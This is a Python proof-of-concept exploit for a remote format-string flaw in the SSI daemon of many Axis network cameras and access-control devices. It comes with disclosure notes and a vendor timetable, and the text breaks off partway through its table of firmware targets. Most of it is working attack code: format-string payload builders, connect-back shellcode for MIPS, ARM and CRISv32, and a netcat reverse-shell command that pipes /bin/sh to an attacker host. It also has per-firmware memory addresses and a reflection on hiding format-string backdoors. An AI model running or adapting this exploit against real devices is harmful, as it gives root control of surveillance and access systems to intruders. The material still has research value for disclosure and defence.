# <CRITICAL> Jan  1 16:05:06 axis /bin/ssid[3110]: ssid.c:635: getpwnam() failed for user: 0x961f0|0x3ac04b10
# <CRITICAL> Jan  1 16:05:06 axis /bin/ssid[3110]: ssid.c:303: Failed to get authorization data.
# ---
#
# Which resulted into an remote exploit for more than 200 unique Axis Communication MPQT/PACS products
#
# ---
# $ netcat -vvlp 31337
# listening on [any] 31337 ...
# 192.168.0.90: inverse host lookup failed: Unknown host
# connect to [192.168.0.1] from (UNKNOWN) [192.168.0.90] 55738
# id
# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),6(disk),10(wheel),51(viewer),52(operator),53(admin),54(system),55(ptz)
# pwd
# /usr/html
# ---
#
# Some technical notes:
#
# 1.  Direct addressing with %<argument>$%n is "delayed", and comes in force only after disconnect.
#     Old metod with POP's coming into force instantly
#
# 2.  Argument "0" will be assigned (after using old POP metod and %n WRITE) the next address on stack after POP's)
#     - Would be interesting to investigate why.
#
# 3.  Normal Apache badbytes: 0x00, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20, 0x23, 0x26
#     Goodbytes: 0x01-0x08, 0x0e-0x1f, 0x21-0x22, 0x24-0x25, 0x27-0xff
#
# 3.1 Normal Boa badbytes: 0x00-0x08, 0x0b-0x0c, 0x0e-0x19, 0x80-0xff
#     Goodbytes: 0x09, 0x0a, 0x0d, 0x20-0x7f
#
# 3.2 Apache and Boa, by using URL encoded shellcode as in this exploit:
#     Badbytes = None, Goodbytes = 0x00 - 0xff (Yay!)
#
# 4.  Everything is randomized, except heap.
#
# 5.  My initial attempts to use ROP's was not good, as I didn't want to create
#     one unique FMS key by testing each single firmware version, and using ROP with FMS
#     on heap seems pretty complicated as there is one jump availible, maximum two.
#
# 5.1 Classic GOT write for free() that will jump to shellcode, was the best technique in this case.
#    
# 6.  Encoded and Decoded shellcode located in .bss section.
# 6.1 FMS excecuted on heap
#
# 7.  Vulnerable MPQT/PACS architectures: CRISv32, MIPS and ARM
# 7.1 ARM has nonexecutable stack flag bit set (>5.20.x) by default on their binaries/libs,
#     so execute shellcode on heap/stack may be impossible.
# 7.2 ARM shellcode and exploit has been verified by setting executable stack flag bit on binaries,
#     and re-compile of the image.
# 7.3 However, ARM is easily exploitable with netcat shell, that's using the builtin '/bin/sh -c' code to execute.
#
# 8.  This exploit are pretty well documented, more details can be extracted by reading
#     the code and comments.
#
# MIPS ssid maps
# 00400000-0040d000 r-xp 00000000 00:01 2272       /bin/ssid
# 0041d000-0041e000 rw-p 0000d000 00:01 2272       /bin/ssid
# 0041e000-00445000 rwxp 00000000 00:00 0          [heap]
#
# ARM ssid maps
# 00008000-00014000 r-xp 00000000 00:01 2055        /bin/ssid
# 0001c000-0001d000 rw-p 0000c000 00:01 2055        /bin/ssid
# 0001d000-00044000 rw-p 00000000 00:00 0           [heap]
#
# Crisv32 ssid maps
# 00080000-0008c000 r-xp 00000000 1f:03 115        /bin/ssid
# 0008c000-0008e000 rw-p 0000a000 1f:03 115        /bin/ssid
# 0008e000-000b6000 rwxp 0008e000 00:00 0          [heap]
#
# General notes:
#
# When the vul daemon process is exploited, and after popping root connect-back shell,
# the main process are usally restarted by respawnd, after the shell have spawned and taken over the parent process,
# when the main process are fully alive again, I can enjoy the shell, and everybody else can
# enjoy of the camera - that should make all of us happy ;)
# During exploiting, logs says almost nothing, only that the main process restarted.
# Note: Not true with ARM Netcat PIPE shell (as the code will vfork() and wait until child exits)
#
# '&http_user=' is the vuln tag, and the FMS will be excecuted when it will try to do vsyslog(),
# after ssid cannot verify the user, free() are the closest function to be called after
# vsyslog(), needed and perfect to use for jumping.
# There is nothing shown for remote user, possible output of FMS are _only_ shown in log/console.
# So we are pretty blind, but due to fixed FMS keys, that doesn't matter for us - it's predictable by statistics.
#
# Quite surprised to see so many different devices and under one major release version,
# that's covered by one "FMS key". The "FMS key" are valid for all minor versions under the major version.
#
# This made me start thinking how brilliant and clever it would be to make an sophisticated door that's using format string as backdoor,  
# which generates no FMS output whatsoever to attacker and unlocked by a 'FMS key', instead of using hardcoded login/password.    
#
# - No hardcoded login/password that could easily be found in firmware/software files.    
# - Extremely hard to find without local access (and find out what to trigger for opening the door)
# - Nobody can not actually prove it is a sophisticated door for sure. "It's just another bug.. sorry! - here is the fixed version."
#   (Only to close this door, and open another door, somewhere else, in any binary - and try make it harder to find)
#
# Note:
# I don't say that Axis Communication has made this hidden format string by this purpose.
# I can only believe it was a really stupid mistake from Axis side, after I have seen one screen-dump of the CVS changelog of SSI Daemon,    
# and another screen-dump with the change made late 2009, from non-vulnerable to vulnerable, in the affected code of logerr().
#
# Vulnerable and exploitable products
#
# A1001, A8004-VE, A9188, C3003, F34, F41, F44, M1124, M1124-E, M1125, M1125-E, M1145, M1145-L, M3006,
# M3007, M3026, M3027, M3037, M7010, M7011, M7014, M7016, P1125, P1353, P1354, P1355, P1357, P1364,
# P1365, P1405, P1405-E, P1405-LE, P1425-E, P1425-LE, P1427, P1427-E, P1435, P3214, P3214-V, P3215,
# P3215-V, P3224, P3224-LVE, P3225-LV, P3353, P3354, P3363, P3364, P3364-L, P3365, P3367, P3384,
# P3707-PE, P3904, P3904-R, P3905, P3915-R, P5414-E, P5415-E, P5514, P5514-E, P5515, P5515-E, P5624,
# P5624-E, P5635-E, P7210, P7214, P7216, P7224, P8535, Q1602, Q1604, Q1614, Q1615, Q1635, Q1635-E,
# Q1765-LE, Q1765-LE-PT, Q1775, Q1931-E, Q1931-E-PT, Q1932-E, Q1932-E-PT, Q1941-E, Q2901-E, Q2901-E-PT,
# Q3504, Q3505, Q6000-E, Q6042, Q6042-C, Q6042-E, Q6042-S, Q6044, Q6044-C, Q6044-E, Q6044-S, Q6045,
# Q6045-C, Q6045-E, Q6045-S, Q6114-E, Q6115-E, Q7411, Q7424-R, Q7436, Q8414, Q8414-LVS, Q8631-E, Q8632-E,
# Q8665-E, Q8665-LE, V5914, V5915, M1054, M1103, M1104, M1113, M1114, M2014-E, M3014, M3113, M3114, M3203,
# M3204, M5013, M5014, M7001, P12/M20, P1204, P1214, P1214-E, P1224-E, P1343, P1344, P1346, P1347, P2014-E,
# P3301, P3304, P3343, P3344, P3346, P3346-E, P5512, P5512-E, P5522, P5522-E, P5532, P5532-E, P5534, P5534-E,
# P5544, P8221, P8513, P8514, P8524, Q1755, Q1910, Q1921, Q1922, Q6032, Q6032-C, Q6032-E, Q6034, Q6034-C,
# Q6034-E, Q6035, Q6035-C, Q6035-E, Q7401, Q7404, Q7406, Q7414, Q8721-E, Q8722-E, C, M1004-W, M1011, M1011-W,
# M1013, M1014, M1025, M1031-W, M1033-W, M1034-W, M1143-L, M1144-L, M3004, M3005, M3011, M3024, M3024-L,
# M3025, M3044-V, M3045-V, M3046-V, P1311, P1428-E, P7701, Q3709-PVE, Q3708-PVE, Q6128-E... and more
#
# http://origin-www.axis.com/ftp/pub_soft/MPQT/SR/service-releases.txt
#
# Firmware versions vulnerable to the SSI FMS exploit
#
# ('V.Vx' == The FMS key used in this exploit)
#
# Firmware	Introduced	CRISv32		MIPS		ARM (no exec heap from >5.20.x)
# 5.00.x	2008		-		-		no
# 5.01.x	2008		no		-		no
# 5.02.x	2008		no		-		-
# 5.05.x	2009		no		-		-
# 5.06.x	2009		no		-		-
# 5.07.x	2009		no		-		no
# 5.08.x	2010		no		-		-
# 5.09.x	2010		no		-		-
# 5.10.x	2009		no		-		-
# 5.11.x	2010		no		-		-
# 5.12.x	2010		no		-		-
# 5.15.x	2010		no		-		-
# 5.16.x	2010		no		-		-
# 5.20.x	2010-2011	5.2x		-		5.2x
# 5.21.x	2011		5.2x		-		5.2x
# 5.22.x	2011		5.2x		-		-
# 5.25.x	2011		5.2x		-		-
# 5.40.x	2011		5.4x		5.4x		5.4x
# 5.41.x	2012		5.4x		-		-
# 5.50.x	2013		5.5x		5.5x		5.4x
# 5.51.x	2013		-		5.4x		-
# 5.55.x	2013		-		5.5x		5.5x
# 5.60.x	2014		-		5.6x		5.6x
# 5.65.x	2014-2015	-		5.6x		-
# 5.70.x	2015		-		5.7x		-
# 5.75.x	2015		-		5.7x		5.7x
# 5.80.x	2015		-		5.8x		5.8x
# 5.81.x	2015		-		5.8x		-
# 5.85.x	2015		-		5.8x		5.8x
# 5.90.x	2015		-		5.9x		-
# 5.95.x	2016		-		5.9x		5.8x
# 6.10.x	2016		-		6.1x		-
# 6.15.x	2016		-		-		6.1x
# 6.20.x	2016		-		6.2x		-
#
# Vendor URL's of still supported and affected products
#
# http://www.axis.com/global/en/products/access-control
# http://www.axis.com/global/en/products/video-encoders
# http://www.axis.com/global/en/products/network-cameras
# http://www.axis.com/global/en/products/audio
#
# Axis Product Security
#
# product-security@axis.com
# http://www.axis.com/global/en/support/product-security
# http://origin-www.axis.com/ftp/pub_soft/MPQT/SR/service-releases.txt
# http://www.axis.com/global/en/support/faq/FAQ116268
#
# Timetable
#
# - Research and Development: 06/01/2016 - 01/06/2016
# - Sent vulnerability details to vendor: 05/06/2016
# - Vendor responce received: 06/06/2016
# - Vendor ACK of findings received: 07/06/2016
# - Vendor sent verification image: 13/06/2016
# - Confirmed that exploit do not work after vendors correction: 13/06/2016
# - Vendor informed about their service release(s): 29/06/2016
# - Sent vendor a copy of the (this) PoC exploit: 29/06/2016
# - Full Disclosure: 18/07/2016
#
# Quote of the day: Never say "whoops! :o", always say "Ah, still interesting! :>"
#
# Have a nice day
# /bashis
#
#####################################################################################

import sys
import string
import socket
import time
import argparse
import urllib, urllib2, httplib
import base64
import ssl
import re


class do_FMS:

#	POP = "%8x"		# Old style POP's with 8 bytes per POP
	POP = "%1c"		# Old style POP's with 1 byte per POP
	WRITElln = "%lln"	# Write 8 bytes
	WRITEn = "%n"		# Write 4 bytes
	WRITEhn = "%hn"		# Write 2 bytes
	WRITEhhn = "%hhn"	# Write 1 byte

	def __init__(self,targetIP,verbose):
		self.targetIP = targetIP
		self.verbose = verbose
		self.fmscode = ""

	# Mostly used internally in this function
	def Add(self, data):
		self.fmscode += data

	# 'New Style' Double word (8 bytes)
	def AddDirectParameterLLN(self, ADDR):
		self.Add('%')
		self.Add(str(ADDR))
		self.Add('$lln')

	# 'New Style' Word (4 bytes)
	def AddDirectParameterN(self, ADDR):
		self.Add('%')
		self.Add(str(ADDR))
		self.Add('$n')

	# 'New Style' Half word (2 bytes)
	def AddDirectParameterHN(self, ADDR):
		self.Add('%')
		self.Add(str(ADDR))
		self.Add('$hn')

	# 'New Style' One Byte (1 byte)
	def AddDirectParameterHHN(self, ADDR):
		self.Add('%')
		self.Add(str(ADDR))
		self.Add('$hhn')

	# Addressing
	def AddADDR(self, ADDR):
		self.Add('%')
		self.Add(str(ADDR))
		self.Add('u')

	# 'Old Style' POP
	def AddPOP(self, size):
		if size != 0:
			self.Add(self.POP * size)

	# Normally only one will be sent, multiple is good to quick-check for any FMS
	#
	# 'Old Style' Double word (8 bytes)
	def AddWRITElln(self, size):
			self.Add(self.WRITElln * size)

	# 'Old Style' Word (4 bytes)
	def AddWRITEn(self, size):
			self.Add(self.WRITEn * size)

	# 'Old Style' Half word (2 bytes)
	def AddWRITEhn(self, size):
			self.Add(self.WRITEhn * size)

	# 'Old Style' One byte (1 byte)
	def AddWRITEhhn(self, size):
			self.Add(self.WRITEhhn * size)

	# Return the whole FMS string
	def FMSbuild(self):
		return self.fmscode

class HTTPconnect:

	def __init__(self, host, proto, verbose, creds, noexploit):
		self.host = host
		self.proto = proto
		self.verbose = verbose
		self.credentials = creds
		self.noexploit = noexploit
	
	# Netcat remote connectback shell needs to have raw HTTP connection as we using special characters as '\t','$','`' etc..
	def RAW(self, uri):
		# Connect-timeout in seconds
		timeout = 5
		socket.setdefaulttimeout(timeout)
		
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		tmp = self.host.split(':')
		HOST = tmp[0]
		PORT = int(tmp[1])
		if self.verbose:
			print "[Verbose] Sending to:", HOST
			print "[Verbose] Port:", PORT
			print "[Verbose] URI:",uri
		s.connect((HOST, PORT))
		s.send("GET %s HTTP/1.0\r\n\r\n" % uri)
		html = (s.recv(4096)) # We really do not care whats coming back
#		if html:
#			print "[i] Received:",html
		s.shutdown(3)
		s.close()
		return html


	def Send(self, uri):

		# The SSI daemon are looking for this, and opens a new FD (5), but this does'nt actually
		# matter for the functionality of this exploit, only for future references.
		headers = { 
			'User-Agent' : 'MSIE',
		}

		# Connect-timeout in seconds
		timeout = 5
		socket.setdefaulttimeout(timeout)

		url = '%s://%s%s' % (self.proto, self.host, uri)

		if self.verbose:
			print "[Verbose] Sending:", url

		if self.proto == 'https':
			if hasattr(ssl, '_create_unverified_context'):
				print "[i] Creating SSL Default Context"
				ssl._create_default_https_context = ssl._create_unverified_context

		if self.credentials:
			Basic_Auth = self.credentials.split(':')
			if self.verbose:
				print "[Verbose] User:",Basic_Auth[0],"Password:",Basic_Auth[1]
			try:
				pwd_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
				pwd_mgr.add_password(None, url, Basic_Auth[0], Basic_Auth[1])
				auth_handler = urllib2.HTTPBasicAuthHandler(pwd_mgr)
				opener = urllib2.build_opener(auth_handler)
				urllib2.install_opener(opener)
			except Exception as e:
				print "[!] Basic Auth Error:",e
				sys.exit(1)

		if self.noexploit and not self.verbose:
			print "[<] 204 Not Sending!"
			html =  "Not sending any data"
		else:
			data = None
			req = urllib2.Request(url, data, headers)
			rsp = urllib2.urlopen(req)
			if rsp:
				print "[<] %s OK" % rsp.code
				html = rsp.read()
		return html


class shellcode_db:

	def __init__(self,targetIP,verbose):
		self.targetIP = targetIP
		self.verbose = verbose

	def sc(self,target):
		self.target = target


# Connect back shellcode
#
# CRISv32: Written by myself, no shellcode availible out on "The Internet"
# NCSH: My PoC of netcat FIFO / PIPE reverese shell, w/o '-e' option and with $IFS as separators
# MIPSel: Written by Jacob Holcomb (url encoded by me)
# ARM: http://shell-storm.org/shellcode/files/shellcode-754.php
#
		# Slightly modified syscall's
		MIPSel = string.join([
		#close stdin
		"%ff%ff%04%28" #slti	a0,zero,-1
		"%a6%0f%02%24" #li	v0,4006
		"%4c%f7%f7%03" #syscall	0xdfdfd
		#close stdout
		"%11%11%04%28" #slti	a0,zero,4369
		"%a6%0f%02%24" #li	v0,4006
		"%4c%f7%f7%03" #syscall 0xdfdfd
		#close stderr
		"%fd%ff%0c%24" #li	t4,-3
		"%27%20%80%01" #nor	a0,t4,zero
		"%a6%0f%02%24" #li	v0,4006
		"%4c%f7%f7%03" #syscall 0xdfdfd
		# socket AF_INET (2)
		"%fd%ff%0c%24" #li	t4,-3
		"%27%20%80%01" #nor	a0,t4,zero
		"%27%28%80%01" #nor	a1,t4,zero
		"%ff%ff%06%28" #slti	a2,zero,-1
		"%57%10%02%24" #li	v0,4183
		"%4c%f7%f7%03" #syscall 0xdfdfd
		#
		"%ff%ff%44%30" # andi $a0, $v0, 0xFFFF
		#
		# dup2 stdout
		"%c9%0f%02%24" #li	v0,4041
		"%4c%f7%f7%03" #syscall 0xdfdfd
		#
		# dup2 stderr
		"%c9%0f%02%24" #li	v0,4041
		"%4c%f7%f7%03" #syscall 0xdfdfd
		#
		# Port
		"PP1PP0%05%3c"
		"%01%ff%a5%34"
		#
		"%01%01%a5%20" #addi	a1,a1,257
		"%f8%ff%a5%af" #sw	a1,-8(sp)
		#
		# IP
		"IP3IP4%05%3c"
		"IP1IP2%a5%34"
		#
		"%fc%ff%a5%af" #sw	a1,-4(sp)
		"%f8%ff%a5%23" #addi	a1,sp,-8
		"%ef%ff%0c%24" #li	t4,-17
		"%27%30%80%01" #nor	a2,t4,zero
		"%4a%10%02%24" #li	v0,4170
		"%4c%f7%f7%03" #syscall 0xdfdfd
		#
		"%62%69%08%3c" #lui	t0,0x6962
		"%2f%2f%08%35" #ori	t0,t0,0x2f2f
		"%ec%ff%a8%af" #sw	t0,-20(sp)
		"%73%68%08%3c" #lui	t0,0x6873
		"%6e%2f%08%35" #ori	t0,t0,0x2f6e
		"%f0%ff%a8%af" #sw	t0,-16(sp
		"%ff%ff%07%28" #slti	a3,zero,-1
		"%f4%ff%a7%af" #sw	a3,-12(sp)
		"%fc%ff%a7%af" #sw	a3,-4(sp
		"%ec%ff%a4%23" #addi	a0,sp,-20
		"%ec%ff%a8%23" #addi	t0,sp,-20
		"%f8%ff%a8%af" #sw	t0,-8(sp)
		"%f8%ff%a5%23" #addi	a1,sp,-8
		"%ec%ff%bd%27" #addiu	sp,sp,-20
		"%ff%ff%06%28" #slti	a2,zero,-1
		"%ab%0f%02%24" #li	v0,4011 (execve)
		"%4c%f7%f7%03" #syscall 0xdfdfd
		], '')	

		# Working netcat shell
		# - $PATH will locate 'mkfifo', 'nc' and 'rm'
		# - LHOST / LPORT will be changed on the fly later in the code
		# - 1) make FIFO, 2) netcat back to attacker with STDIN to /bin/sh, and PIPE STDOUT back to the remote via FIFO, 3) remove FIFO when exiting
		# - $IFS = <space><tab><newline> [By default, and we need <space> or <tab> as separator]
		# $ echo -n "$IFS" | hexdump -C
		# 00000000  20 09 0a
		# - $PS1 = $ [By default, and we need something to "comment" out our trailing FMS code from /bin/sh -c]
		#
		# '2>/tmp/s' (STDERR > FIFO) Don't work with $IFS as separator
		#
		# Working with Apache and Boa
#		NCSH = "mkfifo$IFS/tmp/s;nc$IFS-w$IFS\"5\"$IFS\"LHOST\"$IFS\"LPORT\"$IFS0</tmp/s|/bin/sh>/tmp/s\"$IFS\"2>/tmp/s;rm$IFS/tmp/s;$PS1"
		NCSH = "mkfifo$IFS/tmp/s;nc$IFS-w$IFS\"5\"$IFS\"LHOST\"$IFS\"LPORT\"$IFS0</tmp/s|/bin/sh>/tmp/s;rm$IFS/tmp/s;$PS1"

		ARMel = string.join([
		# original: http://shell-storm.org/shellcode/files/shellcode-754.php
		# 32-bit instructions, enter thumb mode
		"%01%10%8f%e2"	# add r1, pc, #1
		"%11%ff%2f%e1"	# bx r1

		# 16-bit thumb instructions follow
		#
		# socket(2, 1, 0)
		"%02%20"	#mov     r0, #2
		"%01%21"	#mov     r1, #1
		"%92%1a"	#sub     r2, r2, r2
		"%0f%02"	#lsl     r7, r1, #8
		"%19%37"	#add     r7, r7, #25
		"%01%df"	#svc     1
		#
		# connect(r0, &addr, 16)
		"%06%1c"	#mov     r6, r0
		"%08%a1"	#add     r1, pc, #32
		"%10%22"	#mov     r2, #16
		"%02%37"	#add     r7, #2
		"%01%df"	#svc     1
		#
		# dup2(r0, 0/1/2)
		"%3f%27"	#mov     r7, #63
		"%02%21"	#mov     r1, #2
		#
		#lb:
		"%30%1c"	#mov     r0, r6
		"%01%df"	#svc     1
		"%01%39"	#sub     r1, #1
		"%fb%d5"	#bpl     lb
		#
		# execve("/bin/sh", ["/bin/sh", 0], 0)
		"%05%a0"	#add     r0, pc, #20
		"%92%1a"	#sub     r2, r2, r2
		"%05%b4"	#push    {r0, r2}
		"%69%46"	#mov     r1, sp
		"%0b%27"	#mov     r7, #11
		"%01%df"	#svc     1
		#
		"%c0%46"	# .align 2 (NOP)
		"%02%00"	# .short 0x2		(struct sockaddr)
		"PP1PP0"	# .short 0x3412		(port: 0x1234)
		"IP1IP2IP3IP4"	#.byte 192,168,57,1	(ip: 192.168.57.1)
		# .ascii "/bin/sh\0\0"
		"%2f%62%69%6e"	# /bin
		"%2f%73%68%00%00"	# /sh\x00\x00
		"%00%00%00%00"
		"%c0%46"
		], '')	


		# Connect-back shell for Axis CRISv32
		# Written by mcw noemail eu 2016
		#
		CRISv32 = string.join([
		#close(0)
		"%7a%86"		# clear.d r10 
		"%5f%9c%06%00"		# movu.w 0x6,r9
		"%3d%e9"		# break 13
		#close(1)
		"%41%a2"		# moveq 1,r10
		"%5f%9c%06%00"		# movu.w 0x6,r9
		"%3d%e9"		# break 13
		#close(2)
		"%42%a2"		# moveq 2,r10
		"%5f%9c%06%00"		# movu.w 0x6,r9
		"%3d%e9"		# break 13
		#
		"%10%e1"		# addoq 16,sp,acr
		"%42%92"		# moveq 2,r9
		"%df%9b"		# move.w r9,[acr]
		"%10%e1"		# addoq 16,sp,acr
		"%02%f2"		# addq 2,acr
		#PORT
		"%5f%9ePP1PP0"		# move.w 0xPP1PP0,r9 #
		"%df%9b"		# move.w r9,[acr]
		"%10%e1"		# addoq 16,sp,acr
		"%6f%96"		# move.d acr,r9
		"%04%92"		# addq 4,r9
		#IP
		"%6f%feIP1IP2IP3IP4"	# move.d IP4IP3IP2IP1,acr
		"%e9%fb"		# move.d acr,[r9]
		#
		#socket()
		"%42%a2"		# moveq 2,r10
		"%41%b2"		# moveq 1,r11
		"%7c%86"		# clear.d r12
		"%6e%96"		# move.d $sp,$r9
		"%e9%af"		# move.d $r10,[$r9+]
		"%e9%bf"		# move.d $r11,[$r9+]
		"%e9%cf"		# move.d $r12,[$r9+]
		"%41%a2"		# moveq 1,$r10
		"%6e%b6"		# move.d $sp,$r11
		"%5f%9c%66%00"		# movu.w 0x66,$r9
		"%3d%e9"		# break 13
		#
		"%6a%96"		# move.d $r10,$r9
		"%0c%e1"		# addoq 12,$sp,$acr
		"%ef%9b"		# move.d $r9,[$acr]
		"%0c%e1"		# addoq 12,$sp,$acr
		"%6e%96"		# move.d $sp,$r9
		"%10%92"		# addq 16,$r9
		"%6f%aa"		# move.d [$acr],$r10
		"%69%b6"		# move.d $r9,$r11
		"%50%c2"		# moveq 16,$r12
		#
		# connect()
		"%6e%96"		# move.d $sp,$r9
		"%e9%af"		# move.d $r10,[$r9+]
		"%e9%bf"		# move.d $r11,[$r9+]
		"%e9%cf"		# move.d $r12,[$r9+]
		"%43%a2"		# moveq 3,$r10
		"%6e%b6"		# move.d $sp,$r11
		"%5f%9c%66%00"		# movu.w 0x66,$r9 
		"%3d%e9"		# break 13
		# dup(0) already in socket
		#dup(1)
		"%6f%aa"		# move.d [$acr],$r10
		"%41%b2"		# moveq 1,$r11
		"%5f%9c%3f%00"		# movu.w 0x3f,$r9
		"%3d%e9"		# break 13
		#
		#dup(2)
		"%6f%aa"		# move.d [$acr],$r10
		"%42%b2"		# moveq 2,$r11
		"%5f%9c%3f%00"		# movu.w 0x3f,$r9
		"%3d%e9"		# break 13
		#
		#execve("/bin/sh",NULL,NULL)
		"%90%e2"		# subq 16,$sp
		"%6e%96"		# move.d $sp,$r9
		"%6e%a6"		# move.d $sp,$10
		"%6f%0e%2f%2f%62%69"	# move.d 69622f2f,$r0
		"%e9%0b"		# move.d $r0,[$r9]
		"%04%92"		# addq 4,$r9
		"%6f%0e%6e%2f%73%68"	# move.d 68732f6e,$r0
		"%e9%0b"		# move.d $r0,[$r9]
		"%04%92"		# addq 4,$r9
		"%79%8a"		# clear.d [$r9]
		"%04%92"		# addq 4,$r9
		"%79%8a"		# clear.d [$r9]
		"%04%92"		# addq 4,$r9
		"%e9%ab"		# move.d $r10,[$r9]
		"%04%92"		# addq 4,$r9
		"%79%8a"		# clear.d [$r9]
		"%10%e2"		# addq 16,$sp
		"%6e%f6"		# move.d $sp,$acr
		"%6e%96"		# move.d $sp,$r9
		"%6e%b6"		# move.d $sp,$r11
		"%7c%86"		# clear.d $r12
		"%4b%92"		# moveq 11,$r9
		"%3d%e9"		# break 13
			], '')	


		if self.target == 'MIPSel':
			return MIPSel
		elif self.target == 'ARMel':
			return ARMel
		elif self.target == 'CRISv32':
			return CRISv32
		elif self.target == 'NCSH1':
			return NCSH
		elif self.target == 'NCSH2':
			return NCSH
		else:
			print "[!] Unknown shellcode! (%s)" % str(self.target)
			sys.exit(1)


class FMSdb:

	def __init__(self,targetIP,verbose):
		self.targetIP = targetIP
		self.verbose = verbose

	def FMSkey(self,target):
		self.target = target

		target_db = {

#-----------------------------------------------------------------------
# All pointing from free() GOT to shellcode on .bss (Except ARM with NCSH)
#-----------------------------------------------------------------------

#
# Using POP format string, AKA 'Old Style'
#
		# MPQT
		'MIPS-5.85.x':	 [
				0x41f370,	# Adjust to GOT free() address
				0x420900,	# .bss shellcode address
				2,		# 1st POP's
				2,		# 2nd POP's
				'axi',		# Aligns injected code
				700,		# How big buffer before shellcode
				'MIPSel'	# Shellcode type
		],

		# MPQT
		'MIPS-5.40.3': [
				0x41e41c,	# Adjust to GOT free() address
				0x4208cc,	# .bss shellcode address
				7,		# 1st POP's
				11,		# 2nd POP's
				'ax',		# Aligns injected code
				450,		# How big buffer before shellcode
				'MIPSel'	# Shellcode type
		],

		# MPQT
		'MIPS-5.4x': [	
				0x41e4cc,	# Adjust to GOT free() address
				0x42097c,	# .bss shellcode address
				7,		# 1st POP's
				11,		# 2nd POP's
				'ax',		# Aligns injected code
				450,		# How big buffer before shellcode
				'MIPSel'	# Shellcode type
		],

		# MPQT
		'MIPS-5.5x': [
				0x41d11c,	# Adjust to GOT free() address
				0x41f728,	# .bss shellcode address
				5,		# 1st POP's
				15,		# 2nd POP's
				'axis',		# Aligns injected code
				700,		# How big buffer before shellcode
				'MIPSel'	# Shellcode type
		],

		# MPQT
		'MIPS-5.55x': [	
				0x41d11c,	# Adjust to GOT free() address
				0x41f728,	# .bss shellcode address
				11,		# 1st POP's
				9,		# 2nd POP's
				'axis',		# Aligns injected code
				700,		# How big buffer before shellcode
				'MIPSel'	# Shellcode type
		],

		# Shared with MPQT and PACS
		'MIPS-5.6x': [	
				0x41d048,	# Adjust to GOT free() address
				0x41f728,	# .bss shellcode address
				5,		# 1st POP's
				15,		# 2nd POP's
				'axis',		# Aligns injected code
				700,		# How big buffer before shellcode
				'MIPSel'	# Shellcode type

		],

		# MPQT
		'MIPS-5.7x': [	
				0x41d04c,	# Adjust to GOT free() address
				0x41f718,	# .bss shellcode address
				2,		# 1st POP's
				14,		# 2nd POP's
				'axis',		# Aligns injected code
				700,		# How big buffer before shellcode
				'MIPSel'	# Shellcode type
		],

		# MPQT
		'MIPS-5.75x': [
				0x41c498,	# Adjust to GOT free() address
				0x41daf0,	# .bss shellcode address
				3,		# 1st POP's
				13,		# 2nd POP's
				'axi',		# Aligns injected code
				700,		# How big buffer before shellcode
				'MIPSel'	# Shellcode type
		],

		# Shared with MPQT and PACS
		'MIPS-5.8x': [
				0x41d0c0,	# Adjust to GOT free() address
				0x41e740,	# .bss shellcode address
				3,		# 1st POP's
				13,		# 2nd POP's
				'axi',		# Aligns injected code
				700,		# How big buffer before shellcode
				'MIPSel'	# Shellcode type
		],

		# MPQT
		'MIPS-5.9x': [ 
				0x41d0c0,	# Adjust to GOT free() address
				0x41e750,	# .bss shellcode address
				3,		# 1st POP's
				13,		# 2nd POP's
				'axi',		# Aligns injected code
				700,		# How big buffer before shellcode
				'MIPSel'	# Shellcode type
		],

		# MPQT
		'MIPS-6.1x': [
				0x41c480,	# Adjust to GOT free() address
				0x41dac0,	# .bss shellcode address
				3,		# 1st POP's
				13,		# 2nd POP's
				'axi',		# Aligns injected code
				700,		# How big buffer before shellcode
				'MIPSel'	# Shellcode type
		],

		# MPQT
		'MIPS-6.2x': [
				0x41e578,	# Adjust to GOT free() address
				0x41fae0,	# .bss shellcode address
				2,		# 1st POP's
				2,		# 2nd POP's
				'axi',		# Aligns injected code
				700,		# How big buffer before shellcode
				'MIPSel'	# Shellcode type
		],

		# MPQT
		'MIPS-6.20x': [
				0x41d0c4,	# Adjust to GOT free() address
				0x41e700,	# .bss shellcode address
				3,		# 1st POP's
				13,		# 2nd POP's
				'axi',		# Aligns injected code
				700,		# How big buffer before shellcode
				'MIPSel'	# Shellcode type
		],

		# PACS
		'MIPS-1.3x': [
				0x41e4cc,	# Adjust to GOT free() address
				0x420a78,	# .bss shellcode address
				7,		# 1st POP's
				11,		# 2nd POP's
				'axis',		# Aligns injected code
				700,		# How big buffer before shellcode
				'MIPSel'	# Shellcode type
		],

		# PACS
		'MIPS-1.1x': [
				0x41e268,	# Adjust to GOT free() address
				0x420818,	# .bss shellcode address
				7,		# 1st POP's
				11,		# 2nd POP's
				'axis',		# Aligns injected code
				700,		# How big buffer before shellcode
				'MIPSel'	# Shellcode type
		],

#
# Tested with execstack to set executable stack flag bit on bin's and lib's
#
# These two 'Old Style' are not used in the exploit, but kept here as reference as they has been confirmed working.
#

		# ARMel with bin/libs executable stack flag set with 'execstack'
		# MPQT
		'ARM-5.50x': [			# 
				0x1c1b4,	# Adjust to GOT free() address
				0x1e7c8,	# .bss shellcode address
				93,		# 1st POP's
				1,		# 2nd POP's
				'axis',		# Aligns injected code
				700,		# How big buffer before shellcode
				'ARMel'		# Shellcode type (ARMel)
		],

		# ARMel with bin/libs executable stack flag set with 'execstack'
		# MPQT
		'ARM-5.55x': [			# 
				0x1c15c,	# Adjust to GOT free() address
				0x1e834,	# .bss shellcode address
				59,		# 1st POP's
				80,		# 2nd POP's
				'axis',		# Aligns injected code
				800,		# How big buffer before shellcode
				'ARMel'		# Shellcode type (ARMel)
		],

#
# Using direct parameter access format string, AKA 'New Style'
#
		# MPQT
		'ARM-NCSH-5.20x': [		# AXIS P1311 5.20 (id=root)
				0x1c1b4,	# Adjust to GOT free() address
				0x10178,	# Adjust to "/bin/sh -c; pipe(); vfork(); execve()"
				61,		# 1st POP's
				115,		# 2nd POP's
				143,		# 3rd POP's
				118,		# 4th POP's
				'NCSH2'		# Shellcode type (Netcat Shell)
		],

		# MPQT
		'ARM-NCSH-5.2x': [		# 
				0x1c1b4,	# Adjust to GOT free() address
				0x1013c,	# Adjust to "/bin/sh -c; pipe(); vfork(); execve()"
				61,		# 1st POP's
				115,		# 2nd POP's
				143,		# 3rd POP's
				118,		# 4th POP's
				'NCSH2'		# Shellcode type (Netcat Shell)
		],

		# MPQT
		'ARM-NCSH-5.4x': [		# 
				0x1c1b4,	# Adjust to GOT free() address
